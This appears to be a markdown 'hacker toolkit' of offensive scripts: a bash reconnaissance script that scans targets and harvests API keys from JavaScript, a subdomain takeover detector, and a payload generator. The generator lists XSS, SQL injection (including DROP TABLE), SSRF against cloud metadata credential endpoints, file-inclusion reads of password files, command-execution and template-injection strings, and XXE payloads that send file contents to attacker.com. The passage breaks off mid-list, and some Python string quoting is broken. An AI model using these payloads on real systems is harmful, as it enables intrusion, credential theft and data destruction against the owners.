# 🔥 Elite Hacker Toolkit - Custom Scripts & Payloads
## Professional Bug Bounty & Red Team Arsenal

### 🛠️ Table of Contents
1. [Multi-Purpose Reconnaissance Suite](#recon-suite)
2. [Advanced Payload Generators](#payload-generators)
3. [Automated Exploitation Framework](#exploitation-framework)
4. [Custom Web Shell Collection](#web-shells)
5. [Network Penetration Tools](#network-tools)
6. [Post-Exploitation Utilities](#post-exploitation)
7. [Steganography & Covert Channels](#steganography)
8. [Complete Automation Scripts](#automation-scripts)

---

## 🔍 Multi-Purpose Reconnaissance Suite {#recon-suite}

### Elite Reconnaissance Master Script
```bash
#!/bin/bash
# Elite Reconnaissance Master Script
# Usage: ./elite_recon.sh target.com

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target.com>"
    exit 1
fi

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Create output directory
OUTPUT_DIR="recon_${TARGET}_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR/{subdomains,ports,web,vulnerabilities,credentials,screenshots}

echo -e "${RED}🔥 Elite Reconnaissance Suite${NC}"
echo -e "${YELLOW}Target: $TARGET${NC}"
echo -e "${BLUE}Output: $OUTPUT_DIR${NC}"
echo ""

# Phase 1: Subdomain Enumeration
echo -e "${PURPLE}📋 Phase 1: Advanced Subdomain Enumeration${NC}"

# Multiple subdomain sources
subfinder -d $TARGET -silent -o $OUTPUT_DIR/subdomains/subfinder.txt &
amass enum -passive -d $TARGET -o $OUTPUT_DIR/subdomains/amass.txt &
assetfinder --subs-only $TARGET > $OUTPUT_DIR/subdomains/assetfinder.txt &

# Certificate transparency
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > $OUTPUT_DIR/subdomains/crt.txt &

# DNS brute force
dnsrecon -d $TARGET -D /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt -t brt > $OUTPUT_DIR/subdomains/dnsrecon.txt &

# Shodan subdomain search
if command -v shodan &> /dev/null; then
    shodan search hostname:$TARGET --fields hostnames | grep -oE "[a-zA-Z0-9.-]+\.$TARGET" > $OUTPUT_DIR/subdomains/shodan.txt &
fi

# Wait for subdomain enumeration to complete
wait

# Combine and deduplicate subdomains
cat $OUTPUT_DIR/subdomains/*.txt | sort -u | grep -E "^[a-zA-Z0-9.-]+\.$TARGET$" > $OUTPUT_DIR/subdomains/all_subdomains.txt
SUBDOMAIN_COUNT=$(wc -l < $OUTPUT_DIR/subdomains/all_subdomains.txt)
echo -e "${GREEN}✅ Found $SUBDOMAIN_COUNT unique subdomains${NC}"

# Phase 2: Live Host Discovery
echo -e "${PURPLE}🌐 Phase 2: Live Host Discovery${NC}"

# Check for live hosts with multiple ports
cat $OUTPUT_DIR/subdomains/all_subdomains.txt | httpx -silent -ports 80,443,8080,8443,8000,9000,3000,5000,8888,9999 -status-code -title -tech-detect -content-length -o $OUTPUT_DIR/web/live_hosts.txt

# Extract just the URLs
cat $OUTPUT_DIR/web/live_hosts.txt | awk '{print $1}' > $OUTPUT_DIR/web/live_urls.txt
LIVE_COUNT=$(wc -l < $OUTPUT_DIR/web/live_urls.txt)
echo -e "${GREEN}✅ Found $LIVE_COUNT live hosts${NC}"

# Phase 3: Port Scanning
echo -e "${PURPLE}🔍 Phase 3: Advanced Port Scanning${NC}"

# Extract unique IPs
cat $OUTPUT_DIR/web/live_urls.txt | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1 | sort -u > $OUTPUT_DIR/ports/live_ips.txt

# Fast port scan with rustscan
if command -v rustscan &> /dev/null; then
    rustscan -a $OUTPUT_DIR/ports/live_ips.txt --ulimit 5000 -- -sV -sC -oN $OUTPUT_DIR/ports/rustscan.txt &
fi

# Comprehensive nmap scan
nmap -iL $OUTPUT_DIR/ports/live_ips.txt -p- --min-rate 1000 -oN $OUTPUT_DIR/ports/full_scan.txt &

# Service enumeration
nmap -iL $OUTPUT_DIR/ports/live_ips.txt -sV -sC -p 21,22,23,25,53,80,110,135,139,143,443,993,995,1433,3306,3389,5432,5985,5986 -oN $OUTPUT_DIR/ports/service_scan.txt &

wait

echo -e "${GREEN}✅ Port scanning completed${NC}"

# Phase 4: Web Technology Detection
echo -e "${PURPLE}🔧 Phase 4: Web Technology Detection${NC}"

# Whatweb scan
cat $OUTPUT_DIR/web/live_urls.txt | whatweb --color=never --no-errors -a 3 > $OUTPUT_DIR/web/whatweb.txt

# Wappalyzer-like detection
cat $OUTPUT_DIR/web/live_urls.txt | httpx -silent -tech-detect > $OUTPUT_DIR/web/technologies.txt

# Nuclei vulnerability scan
if command -v nuclei &> /dev/null; then
    nuclei -l $OUTPUT_DIR/web/live_urls.txt -t /root/nuclei-templates/ -severity critical,high,medium -o $OUTPUT_DIR/vulnerabilities/nuclei.txt &
fi

echo -e "${GREEN}✅ Technology detection completed${NC}"

# Phase 5: Directory and File Discovery
echo -e "${PURPLE}📁 Phase 5: Directory and File Discovery${NC}"

# Create custom wordlist
cat > $OUTPUT_DIR/web/custom_wordlist.txt << 'EOF'
admin
administrator
api
backup
config
database
db
debug
dev
development
docs
download
files
ftp
git
hidden
include
includes
login
logs
old
private
secret
src
staging
temp
test
testing
tmp
upload
uploads
user
users
www
.env
.git
.htaccess
.htpasswd
config.php
database.sql
phpinfo.php
robots.txt
sitemap.xml
EOF

# Directory brute force with multiple tools
for url in $(head -10 $OUTPUT_DIR/web/live_urls.txt); do
    echo -e "${CYAN}🎯 Scanning directories for: $url${NC}"
    
    # Gobuster
    gobuster dir -u $url -w $OUTPUT_DIR/web/custom_wordlist.txt -x php,html,js,txt,xml,json,bak,old -o $OUTPUT_DIR/web/gobuster_$(echo $url | sed 's|https\?://||' | tr '/' '_').txt 2>/dev/null &
    
    # Feroxbuster
    if command -v feroxbuster &> /dev/null; then
        feroxbuster -u $url -w $OUTPUT_DIR/web/custom_wordlist.txt -x php,html,js,txt,xml,json,bak,old -o $OUTPUT_DIR/web/ferox_$(echo $url | sed 's|https\?://||' | tr '/' '_').txt 2>/dev/null &
    fi
    
    # Limit concurrent scans
    if (( $(jobs -r | wc -l) >= 5 )); then
        wait
    fi
done

wait

echo -e "${GREEN}✅ Directory discovery completed${NC}"

# Phase 6: Parameter Discovery
echo -e "${PURPLE}🔍 Phase 6: Parameter Discovery${NC}"

# Arjun parameter discovery
if command -v arjun &> /dev/null; then
    for url in $(head -5 $OUTPUT_DIR/web/live_urls.txt); do
        arjun -u $url -oT $OUTPUT_DIR/web/params_$(echo $url | sed 's|https\?://||' | tr '/' '_').txt &
    done
    wait
fi

# Parameter mining from wayback machine
cat $OUTPUT_DIR/web/live_urls.txt | head -10 | gau | grep "=" | qsreplace "FUZZ" > $OUTPUT_DIR/web/parameters.txt

echo -e "${GREEN}✅ Parameter discovery completed${NC}"

# Phase 7: JavaScript Analysis
echo -e "${PURPLE}⚡ Phase 7: JavaScript Analysis${NC}"

# Find all JS files
cat $OUTPUT_DIR/web/live_urls.txt | katana -d 3 -js-crawl | grep "\.js$" > $OUTPUT_DIR/web/js_files.txt

# Extract secrets from JS files
echo -e "${CYAN}🔍 Extracting secrets from JavaScript files...${NC}"
mkdir -p $OUTPUT_DIR/credentials/js_secrets

for js_file in $(head -20 $OUTPUT_DIR/web/js_files.txt); do
    echo "Analyzing: $js_file"
    curl -s "$js_file" | grep -Eo "(AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|sk_test_[0-9a-zA-Z]{24}|AIza[0-9A-Za-z\-_]{35}|ya29\.[0-9A-Za-z\-_]+|ghp_[0-9A-Za-z]{36}|github_pat_[0-9A-Za-z_]{82})" >> $OUTPUT_DIR/credentials/js_secrets/secrets.txt 2>/dev/null
done

# Remove duplicates
if [ -f $OUTPUT_DIR/credentials/js_secrets/secrets.txt ]; then
    sort -u $OUTPUT_DIR/credentials/js_secrets/secrets.txt > $OUTPUT_DIR/credentials/js_secrets/unique_secrets.txt
    SECRET_COUNT=$(wc -l < $OUTPUT_DIR/credentials/js_secrets/unique_secrets.txt)
    echo -e "${GREEN}✅ Found $SECRET_COUNT unique secrets${NC}"
fi

echo -e "${GREEN}✅ JavaScript analysis completed${NC}"

# Phase 8: Screenshot Collection
echo -e "${PURPLE}📸 Phase 8: Screenshot Collection${NC}"

# Take screenshots of live hosts
if command -v gowitness &> /dev/null; then
    gowitness file -f $OUTPUT_DIR/web/live_urls.txt -P $OUTPUT_DIR/screenshots/ --disable-logging &
elif command -v aquatone &> /dev/null; then
    cat $OUTPUT_DIR/web/live_urls.txt | aquatone -out $OUTPUT_DIR/screenshots/ &
fi

wait

echo -e "${GREEN}✅ Screenshot collection completed${NC}"

# Phase 9: Vulnerability Assessment
echo -e "${PURPLE}🚨 Phase 9: Vulnerability Assessment${NC}"

# SQL injection testing
echo -e "${CYAN}💉 Testing for SQL injection...${NC}"
if [ -f $OUTPUT_DIR/web/parameters.txt ]; then
    sqlmap -m $OUTPUT_DIR/web/parameters.txt --batch --level=3 --risk=2 --threads=5 --output-dir=$OUTPUT_DIR/vulnerabilities/sqlmap/ 2>/dev/null &
fi

# XSS testing
echo -e "${CYAN}🎪 Testing for XSS...${NC}"
if [ -f $OUTPUT_DIR/web/parameters.txt ]; then
    head -50 $OUTPUT_DIR/web/parameters.txt | while read url; do
        echo "Testing XSS: $url"
        curl -s "$url" -d "q=<script>alert('XSS')</script>" | grep -q "<script>alert('XSS')</script>" && echo "Potential XSS: $url" >> $OUTPUT_DIR/vulnerabilities/xss_findings.txt
    done &
fi

wait

echo -e "${GREEN}✅ Vulnerability assessment completed${NC}"

# Phase 10: Report Generation
echo -e "${PURPLE}📋 Phase 10: Report Generation${NC}"

# Generate comprehensive report
cat > $OUTPUT_DIR/reconnaissance_report.md << EOF
# 🔥 Elite Reconnaissance Report
**Target:** $TARGET  
**Date:** $(date)  
**Scan Duration:** $(date -d @$(($(date +%s) - START_TIME)) -u +%H:%M:%S)

## 📊 Executive Summary
- **Subdomains Found:** $SUBDOMAIN_COUNT
- **Live Hosts:** $LIVE_COUNT
- **Secrets Found:** ${SECRET_COUNT:-0}
- **Screenshots Captured:** $(ls $OUTPUT_DIR/screenshots/ 2>/dev/null | wc -l)

## 🎯 Key Findings

### Subdomains
$(head -20 $OUTPUT_DIR/subdomains/all_subdomains.txt | sed 's/^/- /')

### Live Hosts
$(head -20 $OUTPUT_DIR/web/live_urls.txt | sed 's/^/- /')

### Technologies Detected
$(grep -h "200" $OUTPUT_DIR/web/live_hosts.txt | head -10 | awk '{print "- " $1 " - " $3}')

### Potential Vulnerabilities
$(if [ -f $OUTPUT_DIR/vulnerabilities/nuclei.txt ]; then head -10 $OUTPUT_DIR/vulnerabilities/nuclei.txt | sed 's/^/- /'; fi)

### Secrets Found
$(if [ -f $OUTPUT_DIR/credentials/js_secrets/unique_secrets.txt ]; then head -10 $OUTPUT_DIR/credentials/js_secrets/unique_secrets.txt | sed 's/^/- /'; fi)

## 🛡️ Recommendations
1. Review and secure exposed services
2. Implement proper input validation
3. Remove sensitive information from client-side code
4. Enable security headers
5. Regular security assessments

## 📁 Files Generated
- Subdomains: $OUTPUT_DIR/subdomains/
- Port scans: $OUTPUT_DIR/ports/
- Web analysis: $OUTPUT_DIR/web/
- Vulnerabilities: $OUTPUT_DIR/vulnerabilities/
- Screenshots: $OUTPUT_DIR/screenshots/
- Credentials: $OUTPUT_DIR/credentials/
EOF

echo -e "${GREEN}✅ Report generated: $OUTPUT_DIR/reconnaissance_report.md${NC}"

# Final summary
echo ""
echo -e "${RED}🎉 Elite Reconnaissance Complete!${NC}"
echo -e "${YELLOW}📊 Summary:${NC}"
echo -e "  Subdomains: $SUBDOMAIN_COUNT"
echo -e "  Live Hosts: $LIVE_COUNT"
echo -e "  Secrets: ${SECRET_COUNT:-0}"
echo -e "  Output Directory: $OUTPUT_DIR"
echo ""
echo -e "${BLUE}📋 Next Steps:${NC}"
echo -e "  1. Review the report: $OUTPUT_DIR/reconnaissance_report.md"
echo -e "  2. Analyze screenshots: $OUTPUT_DIR/screenshots/"
echo -e "  3. Test identified vulnerabilities"
echo -e "  4. Investigate found secrets"
```

### Advanced Subdomain Takeover Detector
```python
#!/usr/bin/env python3
# Advanced Subdomain Takeover Detector

import requests
import dns.resolver
import concurrent.futures
import json
import time
from urllib.parse import urlparse

class SubdomainTakeoverDetector:
    def __init__(self):
        self.vulnerable_services = {
            'github.io': {
                'cname': ['github.io'],
                'response': ['There isn't a GitHub Pages site here.'],
                'http_status': [404]
            },
            'herokuapp.com': {
                'cname': ['herokuapp.com'],
                'response': ['No such app'],
                'http_status': [404]
            },
            'wordpress.com': {
                'cname': ['wordpress.com'],
                'response': ['Do you want to register'],
                'http_status': [404]
            },
            'tumblr.com': {
                'cname': ['tumblr.com'],
                'response': ['Whatever you were looking for doesn't currently exist'],
                'http_status': [404]
            },
            'shopify.com': {
                'cname': ['shopify.com'],
                'response': ['Sorry, this shop is currently unavailable'],
                'http_status': [404]
            },
            'amazonaws.com': {
                'cname': ['amazonaws.com'],
                'response': ['NoSuchBucket', 'The specified bucket does not exist'],
                'http_status': [404]
            },
            'cloudfront.net': {
                'cname': ['cloudfront.net'],
                'response': ['Bad Request', 'ERROR: The request could not be satisfied'],
                'http_status': [403, 404]
            },
            'azurewebsites.net': {
                'cname': ['azurewebsites.net'],
                'response': ['Error 404', 'Web Site not found'],
                'http_status': [404]
            },
            'bitbucket.io': {
                'cname': ['bitbucket.io'],
                'response': ['Repository not found'],
                'http_status': [404]
            },
            'surge.sh': {
                'cname': ['surge.sh'],
                'response': ['project not found'],
                'http_status': [404]
            },
            'zendesk.com': {
                'cname': ['zendesk.com'],
                'response': ['Help Center Closed'],
                'http_status': [404]
            },
            'fastly.com': {
                'cname': ['fastly.com'],
                'response': ['Fastly error: unknown domain'],
                'http_status': [404]
            }
        }
        
        self.vulnerable_subdomains = []
        
    def resolve_cname(self, subdomain):
        """Resolve CNAME record for subdomain"""
        try:
            answers = dns.resolver.resolve(subdomain, 'CNAME')
            return [str(rdata) for rdata in answers]
        except:
            return []
    
    def check_http_response(self, subdomain):
        """Check HTTP response for takeover indicators"""
        try:
            response = requests.get(f"http://{subdomain}", timeout=10, allow_redirects=True)
            return response.status_code, response.text
        except:
            try:
                response = requests.get(f"https://{subdomain}", timeout=10, allow_redirects=True)
                return response.status_code, response.text
            except:
                return None, None
    
    def check_subdomain_takeover(self, subdomain):
        """Check if subdomain is vulnerable to takeover"""
        print(f"🔍 Checking: {subdomain}")
        
        # Resolve CNAME
        cnames = self.resolve_cname(subdomain)
        if not cnames:
            return None
        
        # Check HTTP response
        status_code, response_text = self.check_http_response(subdomain)
        if not response_text:
            return None
        
        # Check against known vulnerable services
        for service, indicators in self.vulnerable_services.items():
            # Check CNAME match
            cname_match = any(any(cname_indicator in cname for cname_indicator in indicators['cname']) 
                            for cname in cnames)
            
            if cname_match:
                # Check response indicators
                response_match = any(indicator in response_text for indicator in indicators['response'])
                status_match = status_code in indicators['http_status']
                
                if response_match and status_match:
                    vulnerability = {
                        'subdomain': subdomain,
                        'service': service,
                        'cname': cnames,
                        'status_code': status_code,
                        'evidence': [indicator for indicator in indicators['response'] 
                                   if indicator in response_text]
                    }
                    
                    print(f"🚨 VULNERABLE: {subdomain} -> {service}")
                    return vulnerability
        
        return None
    
    def scan_subdomains(self, subdomain_file, max_workers=20):
        """Scan multiple subdomains for takeover vulnerabilities"""
        print("🔥 Starting Subdomain Takeover Scan")
        
        # Load subdomains
        with open(subdomain_file, 'r') as f:
            subdomains = [line.strip() for line in f if line.strip()]
        
        print(f"📋 Loaded {len(subdomains)} subdomains")
        
        # Parallel scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_subdomain = {
                executor.submit(self.check_subdomain_takeover, subdomain): subdomain 
                for subdomain in subdomains
            }
            
            for future in concurrent.futures.as_completed(future_to_subdomain):
                result = future.result()
                if result:
                    self.vulnerable_subdomains.append(result)
        
        return self.vulnerable_subdomains
    
    def generate_takeover_report(self):
        """Generate subdomain takeover report"""
        if not self.vulnerable_subdomains:
            print("✅ No vulnerable subdomains found")
            return
        
        report = f"""# 🚨 Subdomain Takeover Report
**Generated:** {time.strftime('%Y-%m-%d %H:%M:%S')}
**Vulnerable Subdomains:** {len(self.vulnerable_subdomains)}

## 🎯 Vulnerable Subdomains

"""
        
        for vuln in self.vulnerable_subdomains:
            report += f"""### {vuln['subdomain']}
- **Service:** {vuln['service']}
- **CNAME:** {', '.join(vuln['cname'])}
- **Status Code:** {vuln['status_code']}
- **Evidence:** {', '.join(vuln['evidence'])}

**Exploitation Steps:**
1. Register account on {vuln['service']}
2. Create project/site with name matching CNAME
3. Upload content to demonstrate control
4. Report vulnerability

---

"""
        
        report += """## 🛡️ Remediation
1. Remove unused DNS records
2. Monitor DNS changes
3. Implement DNS monitoring alerts
4. Regular subdomain audits
"""
        
        with open('subdomain_takeover_report.md', 'w') as f:
            f.write(report)
        
        print(f"📋 Report saved: subdomain_takeover_report.md")
        print(f"🚨 Found {len(self.vulnerable_subdomains)} vulnerable subdomains")

# Usage
def main():
    detector = SubdomainTakeoverDetector()
    
    subdomain_file = input("Enter subdomain file path: ")
    vulnerable = detector.scan_subdomains(subdomain_file)
    detector.generate_takeover_report()

if __name__ == "__main__":
    main()
```

---

## 🎯 Advanced Payload Generators {#payload-generators}

### Universal Payload Generator
```python
#!/usr/bin/env python3
# Universal Payload Generator for Multiple Attack Vectors

import base64
import urllib.parse
import html
import json
import random
import string
import hashlib
import binascii

class UniversalPayloadGenerator:
    def __init__(self):
        self.payloads = {
            'xss': [],
            'sqli': [],
            'ssrf': [],
            'lfi': [],
            'rce': [],
            'xxe': [],
            'ssti': []
        }
        
    def generate_xss_payloads(self):
        """Generate XSS payloads with various encoding"""
        base_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus><option>test</option></select>",
            "<textarea onfocus=alert('XSS') autofocus>test</textarea>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>test</marquee>"
        ]
        
        encoded_payloads = []
        
        for payload in base_payloads:
            # Original
            encoded_payloads.append(payload)
            
            # URL encoded
            encoded_payloads.append(urllib.parse.quote(payload))
            
            # Double URL encoded
            encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # HTML entity encoded
            encoded_payloads.append(''.join(f'&#{ord(c)};' for c in payload))
            
            # Hex encoded
            encoded_payloads.append(''.join(f'\x{ord(c):02x}' for c in payload))
            
            # Unicode encoded
            encoded_payloads.append(''.join(f'\u{ord(c):04x}' for c in payload))
            
            # Base64 encoded (for data URIs)
            b64_payload = base64.b64encode(payload.encode()).decode()
            encoded_payloads.append(f"data:text/html;base64,{b64_payload}")
            
            # Mixed case
            mixed_case = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
            encoded_payloads.append(mixed_case)
        
        # Advanced XSS payloads
        advanced_payloads = [
            # Filter bypass
            "<script>window['alert']('XSS')</script>",
            "<script>top['alert']('XSS')</script>",
            "<script>parent['alert']('XSS')</script>",
            "<script>self['alert']('XSS')</script>",
            
            # Function construction
            "<script>Function('alert("XSS")')())</script>",
            "<script>eval('alert("XSS")')</script>",
            "<script>setTimeout('alert("XSS")',0)</script>",
            
            # Template literals
            "<script>alert`XSS`</script>",
            "<script>eval`alert\x28'XSS'\x29`</script>",
            
            # DOM-based
            "<script>document.write(location.hash.slice(1))</script>",
            "<script>eval(location.search.slice(1))</script>",
            
            # Event handlers
            "<body onpageshow=alert('XSS')>",
            "<body onbeforeunload=alert('XSS')>",
            "<body onhashchange=alert('XSS')>",
            "<body onpopstate=alert('XSS')>",
            
            # CSS-based
            "<style>@import'javascript:alert("XSS")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<style>body{background:url('javascript:alert("XSS")')}</style>",
            
            # Polyglot
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        ]
        
        self.payloads['xss'] = encoded_payloads + advanced_payloads
        return self.payloads['xss']
    
    def generate_sqli_payloads(self):
        """Generate SQL injection payloads"""
        sqli_payloads = [
            # Basic injection
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 'a'='a",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
            
            # Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT LENGTH(database()))>5--",
            
            # Time-based blind
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT SLEEP(5))--",
            "' AND (SELECT pg_sleep(5))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Error-based
            "' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
            
            # Stacked queries
            "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
            "'; DROP TABLE users--",
            "'; CREATE TABLE temp (id int)--",
            "'; UPDATE users SET password='hacked' WHERE id=1--",
            
            # WAF bypass
            "/**/UNION/**/SELECT/**/",
            "/*!UNION*//*!SELECT*/",
            "UN/**/ION SE/**/LECT",
            "UNI%00ON SEL%00ECT",
            "UNION%0ASELECT",
            "UNION%0DSELECT",
            "UNION%0CSELECT",
            "UNION%09SELECT",
            "UNION%0BSELECT"
        ]
        
        # Add encoded versions
        encoded_sqli = []
        for payload in sqli_payloads:
            encoded_sqli.append(payload)
            encoded_sqli.append(urllib.parse.quote(payload))
            encoded_sqli.append(payload.replace(' ', '/**/'))
            encoded_sqli.append(payload.replace(' ', '%20'))
            encoded_sqli.append(payload.replace(' ', '+'))
        
        self.payloads['sqli'] = encoded_sqli
        return self.payloads['sqli']
    
    def generate_ssrf_payloads(self):
        """Generate SSRF payloads"""
        ssrf_payloads = [
            # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            
            # GCP metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            
            # Azure metadata
            "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            
            # Internal services
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://0.0.0.0:6379",
            "http://[::1]:80",
            "http://localhost:5432",
            "http://127.0.0.1:27017",
            
            # Bypass techniques
            "http://0177.0.0.1/",  # Octal
            "http://2130706433/",  # Decimal
            "http://017700000001/",  # Mixed
            "http://localhost.localdomain/",
            "http://127.000.000.1/",
            "http://0x7f000001/",  # Hex
            "http://127.1/",  # Short form
            
            # Protocol bypass
            "file:///etc/passwd",
            "file:///c:/windows/system32/drivers/etc/hosts",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:11211/stats",
            
            # DNS rebinding
            "http://1ynrnhl.xip.io/",
            "http://spoofed.burpcollaborator.net/"
        ]
        
        self.payloads['ssrf'] = ssrf_payloads
        return self.payloads['ssrf']
    
    def generate_lfi_payloads(self):
        """Generate Local File Inclusion payloads"""
        lfi_payloads = [
            # Basic LFI
            "../../../etc/passwd",
            "..\..\..\windows\system32\drivers\etc\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Null byte injection
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            
            # Log poisoning
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access_log",
            "/proc/self/environ",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            
            # Windows files
            "C:\windows\system32\drivers\etc\hosts",
            "C:\windows\system32\config\sam",
            "C:\windows\epair\sam",
            "C:\windows\panther\unattend.xml",
            "C:\windows\panther\unattended.xml",
            
            # Common files
            "/etc/shadow",
            "/etc/group",
            "/etc/hosts",
            "/etc/motd",
            "/etc/issue",
            "/proc/version",
            "/proc/cmdline",
            "/proc/meminfo",
            "/proc/cpuinfo"
        ]
        
        # Add encoded versions
        encoded_lfi = []
        for payload in lfi_payloads:
            encoded_lfi.append(payload)
            encoded_lfi.append(urllib.parse.quote(payload))
            encoded_lfi.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        self.payloads['lfi'] = encoded_lfi
        return self.payloads['lfi']
    
    def generate_rce_payloads(self):
        """Generate Remote Code Execution payloads"""
        rce_payloads = [
            # Command injection
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            
            # PHP code injection
            "<?php system('whoami'); ?>",
            "<?php echo shell_exec('whoami'); ?>",
            "<?php passthru('whoami'); ?>",
            "<?php exec('whoami', $output); print_r($output); ?>",
            
            # Python code injection
            "__import__('os').system('whoami')",
            "exec('import os; os.system("whoami")')",
            "eval('__import__("os").system("whoami")')",
            
            # Template injection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            
            # Deserialization
            "O:8:"stdClass":1:{s:4:"test";s:6:"whoami";}",
            
            # Expression Language injection
            "${pageContext.request.getSession().setAttribute("a",pageContext.request.getParameter("a"))}",
            
            # Server-Side JavaScript injection
            "require('child_process').exec('whoami')",
            "global.process.mainModule.require('child_process').exec('whoami')"
        ]
        
        self.payloads['rce'] = rce_payloads
        return self.payloads['rce']
    
    def generate_xxe_payloads(self):
        """Generate XXE payloads"""
        xxe_payloads = [
            # Basic XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            
            # Blind XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<root>&xxe;</root>''',
            
            # Parameter entity XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>
<root></root>''',
            
            # CDATA XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><![CDATA[&xxe;]]></root>''',
            
            # XXE with base64 encoding
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">]>
<root>&xxe;</root>''',
            
            # XXE OOB
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfiltrate;]>
<root></root>'''
        ]
        
        self.payloads['xxe'] = xxe_payloads
        return self.payloads['xxe']
    
    def generate_ssti_payloads(self):
        """Generate Server-Side Template Injection payloads"""
        ssti_payloads = {
            "jinja2": [
                "{{7*7}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}"
            ],
            "twig": [
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('whoami')}}",
                "{{_self.env.enableDebug()}}{{_self.env.enableAutoReload()}}",
                "{{['id']|filter('system')}}"
            ],
            "smarty": [
                "{7*7}",
                "{php}echo `whoami`;{/php}",
                "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',self::clearConfig())}",
                "{system('whoami')}"
            ],
            "freemarker": [
                "${7*7}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('whoami')}",
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}"
            ],
            "velocity": [
